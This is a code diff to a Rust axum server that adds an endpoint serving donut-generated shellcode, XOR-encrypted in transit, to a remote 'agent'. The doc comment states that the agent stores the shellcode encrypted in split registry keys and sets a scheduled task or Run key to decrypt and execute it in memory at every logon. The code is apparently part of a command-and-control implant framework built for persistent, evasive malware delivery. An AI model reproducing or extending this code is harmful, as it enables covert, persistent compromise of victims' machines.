@@ -820,3 +820,86 @@ pub async fn download_ester() -> impl axum::response::IntoResponse {
         payload,
     )
 }
+
+/// Serve donut-processed ester PIC shellcode (XOR-encrypted in transit).
+///
+/// The agent downloads this at auto-persist time, stores it XOR-encrypted
+/// in dual-split registry keys, and creates a loader trigger (schtask/Run key)
+/// that reads, decrypts, and executes the shellcode in memory on every logon.
+///
+/// The shellcode is XOR-encrypted with a random single-use key for transit.
+/// Response layout: `[4-byte key-len LE][key bytes][encrypted shellcode]`
+///
+/// Expected build artefact: `dist/ester.sc` (produced by donut via deploy.ps1).
+pub async fn download_ester_shellcode() -> impl axum::response::IntoResponse {
+    use axum::http::{header, StatusCode};
+    use std::fs;
+
+    let search_paths = ["dist/ester.sc", "ester.sc"];
+    let found = search_paths
+        .iter()
+        .find(|p| std::path::Path::new(p).exists());
+
+    let raw_sc = match found {
+        Some(path) => {
+            tracing::info!("Serving ester shellcode from: {}", path);
+            match fs::read(path) {
+                Ok(b) => b,
+                Err(e) => {
+                    tracing::error!("Failed to read ester.sc from {}: {}", path, e);
+                    return (
+                        StatusCode::INTERNAL_SERVER_ERROR,
+                        [(header::CONTENT_TYPE, "application/octet-stream")],
+                        format!("ERROR:{}", e).into_bytes(),
+                    );
+                }
+            }
+        }
+        None => {
+            tracing::error!(
+                "ester.sc not found; run deploy.ps1 which generates it via donut"
+            );
+            return (
+                StatusCode::NOT_FOUND,
+                [(header::CONTENT_TYPE, "application/octet-stream")],
+                b"ERROR:ester.sc not built".to_vec(),
+            );
+        }
+    };
+
+    // XOR-encrypt for transit with a random key derived from system time
+    let key_len: usize = 32;
+    let now = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .unwrap_or_default()
+        .as_nanos();
+    let mut xor_key = Vec::with_capacity(key_len);
+    for i in 0..key_len {
+        xor_key.push(((now.wrapping_mul(31).wrapping_add(i as u128)) % 256) as u8);
+    }
+
+    let encrypted: Vec<u8> = raw_sc
+        .iter()
+        .enumerate()
+        .map(|(i, &b)| b ^ xor_key[i % xor_key.len()])
+        .collect();
+
+    // Wire format: [4-byte key-len LE][key][encrypted shellcode]
+    let mut payload = Vec::with_capacity(4 + key_len + encrypted.len());
+    payload.extend_from_slice(&(key_len as u32).to_le_bytes());
+    payload.extend_from_slice(&xor_key);
+    payload.extend_from_slice(&encrypted);
+
+    tracing::info!(
+        "Serving ester.sc ({} bytes raw, {} bytes on wire, key {} bytes)",
+        raw_sc.len(),
+        payload.len(),
+        key_len
+    );
+
+    (
+        StatusCode::OK,
+        [(header::CONTENT_TYPE, "application/octet-stream")],
+        payload,
+    )
+}
